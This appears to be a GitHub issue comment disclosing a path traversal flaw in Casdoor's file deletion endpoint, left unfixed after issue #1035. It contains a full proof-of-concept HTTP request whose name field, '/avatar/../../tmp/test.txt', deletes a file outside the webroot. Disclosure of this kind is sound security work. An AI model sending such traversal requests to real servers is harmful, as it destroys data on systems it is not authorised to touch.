| Hi,  I was looking at the fix to [#1035](https://github.com/casdoor/casdoor/issues/1035): [image](https://user-images.githubusercontent.com/26839305/193245742-4033c5e3-85ee-43fe-b18f-81179e0a9a55.png)  And I noticed it only fixes the path traversal in file upload, while file deletion is still vulnerable. Thus, it's possible to delete any file outside application's webroot: [poc](https://user-images.githubusercontent.com/26839305/193246634-1a896ca5-6250-4b79-9ba1-40bad660c6c3.gif)  POC request:  ``` POST /api/delete-resource?provider= HTTP/1.1 Host: localhost:8008 Content-Length: 363 sec-ch-ua: "Chromium";v="105", "Not)A;Brand";v="8" sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36 sec-ch-ua-platform: "Windows" Content-Type: text/plain;charset=UTF-8 Accept: */* Origin: http://localhost:8008 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://localhost:8008/resources Accept-Encoding: gzip, deflate Accept-Language: en,pl-PL;q=0.9,pl;q=0.8,en-US;q=0.7 Cookie: casdoor_session_id=93862e25f31761d7cde831cdf4b93f14; Hm_lvt_5998fcd123c220efc0936edf4f250504=1664531159; Hm_lpvt_5998fcd123c220efc0936edf4f250504=1664531383 Connection: close  {"owner":"built-in","name":"/avatar/../../tmp/test.txt","createdTime":"2022-09-30T09:49:17Z","user":"admin","provider":"app-built-in","application":"app-built-in","tag":"avatar","parent":"CropperDiv","fileName":"admin.jpeg","fileType":"image","fileFormat":".jpeg","fileSize":159547,"url":"/files/avatar/built-in/admin.jpeg?t=1664531357206668083","description":""}  ``` |
